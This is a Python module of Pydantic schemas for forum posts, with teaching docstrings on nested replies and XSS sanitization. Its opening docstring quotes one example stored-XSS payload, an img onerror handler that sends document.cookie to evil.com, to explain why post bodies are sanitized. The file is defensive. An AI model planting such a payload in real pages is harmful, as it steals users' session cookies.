"""
Forum Post (Reply) Schemas
===========================

This module defines Pydantic models for creating, updating, and
displaying forum posts (replies within a thread).

**Interview Concept: Nested / Threaded Comments**

Posts in this forum support **nested replies** — a post can be a direct
reply to the thread (``parent_post_id=None``) or a reply to another post
(``parent_post_id=123``).  This creates a tree structure similar to
Reddit's comment threads.

The ``PostResponse`` schema is **self-referential** — it contains a
``replies`` field of type ``list[PostResponse]``.  Pydantic requires a
special ``model_rebuild()`` call after the class definition to resolve
this forward reference (see the bottom of this file).

**Interview Concept: Why sanitize post bodies?**

Posts are user-generated content displayed to all users in a thread.
A malicious post body like ``<img src=x onerror="document.location='https://evil.com?c='+document.cookie">``
would steal session cookies from every user who views the thread.
The ``sanitize_text()`` validator strips these dangerous constructs
before the data ever reaches the database.
"""

from datetime import datetime

from pydantic import BaseModel, Field, field_validator

from shared.schemas.upload import AttachmentResponse
from shared.schemas.vote import ReactionCountResponse
from shared.services.sanitize import sanitize_text


class PostCreateRequest(BaseModel):
    """
    Schema for creating a new post/reply (POST /api/v1/threads/{id}/posts).

    Fields:
    - ``body``: The post content, 1-5000 chars.  Sanitized via
      ``sanitize_text()`` to prevent stored XSS attacks.
    - ``parent_post_id``: If this reply is to another post (nested reply),
      set this to the parent post's ID.  If ``None``, this is a top-level
      reply to the thread itself.  This field enables Reddit-style
      threaded/nested comment trees.
    - ``attachment_ids``: List of uploaded file IDs to attach to this post.
      Capped at 20 items to prevent abuse.  These IDs reference files
      that were uploaded via the upload endpoint *before* creating the post.
    """

    body: str = Field(min_length=1, max_length=5000)
    # None = top-level reply to the thread; int = nested reply to another post.
    parent_post_id: int | None = None
    # IDs of files previously uploaded via POST /api/v1/uploads.
    # max_length limits the number of attachments, not string length.
    attachment_ids: list[int] = Field(default_factory=list, max_length=20)

    # -- XSS Prevention --
    # Strips <script>, <iframe>, javascript: URIs, onerror= handlers, etc.
    # This is critical because post bodies are rendered as content visible
    # to all users viewing the thread.
    @field_validator("body")
    @classmethod
    def clean_body(cls, v: str) -> str:
        return sanitize_text(v)


class PostUpdateRequest(BaseModel):
    """
    Schema for editing an existing post (PUT /api/v1/threads/{thread_id}/posts/{id}).

    Only the ``body`` can be edited — you can't change which post you're
    replying to after creation.  The same XSS sanitization applies.
    """

    body: str = Field(min_length=1, max_length=5000)

    @field_validator("body")
    @classmethod
    def clean_body(cls, v: str) -> str:
        return sanitize_text(v)


class PostAuthorResponse(BaseModel):
    """
    Lightweight author info embedded in post responses.

    Identical structure to ThreadAuthorResponse — includes only the fields
    needed to render an author badge next to a comment.  ``role`` enables
    the frontend to show flair (e.g., "Admin", "Moderator") next to
    the username.
    """

    id: int
    username: str
    role: str
    avatar_url: str | None = None


class PostResponse(BaseModel):
    """
    Response schema for a single post, including nested replies.

    **Interview Concept: Self-referential (recursive) Pydantic models**

    The ``replies`` field is typed as ``list["PostResponse"]`` — a
    forward reference to the same class.  This creates a recursive
    tree structure:

        PostResponse
        ├── replies: [PostResponse, PostResponse, ...]
        │   ├── replies: [PostResponse, ...]
        │   │   └── replies: []   (leaf node)
        │   └── replies: []
        └── ...

    Because Python hasn't finished defining ``PostResponse`` when it
    encounters the ``replies`` field, we use a string forward reference
    (``"PostResponse"``) and call ``PostResponse.model_rebuild()`` after
    the class is fully defined.  This tells Pydantic to resolve the
    forward reference.

    **Key fields:**
    - ``vote_score`` — Net upvotes minus downvotes on this post.
    - ``user_vote`` — The current user's vote (-1, 0, or +1), so the
      frontend can highlight the active vote button.
    - ``reactions`` — Aggregated emoji reaction counts (e.g., 5x "thumbsup").
    - ``attachments`` — Files attached to this post.
    - ``replies`` — Nested child posts (recursive tree structure).
    """

    id: int
    thread_id: int
    parent_post_id: int | None  # None for top-level replies
    body: str
    created_at: datetime
    updated_at: datetime
    vote_score: int = 0  # Net score (upvotes - downvotes)
    user_vote: int = 0  # Current user's vote on this post
    reactions: list[ReactionCountResponse] = []
    author: PostAuthorResponse
    attachments: list[AttachmentResponse] = []
    replies: list["PostResponse"] = []  # Recursive: nested child posts


# ---------------------------------------------------------------------------
# IMPORTANT: This call resolves the forward reference "PostResponse" in the
# ``replies`` field above.  Without it, Pydantic would fail at runtime with
# a "PydanticUndefinedAnnotation" error when trying to serialize a response.
#
# This is required whenever a Pydantic model references itself (directly or
# indirectly).  It must be called AFTER the class is fully defined.
# ---------------------------------------------------------------------------
PostResponse.model_rebuild()
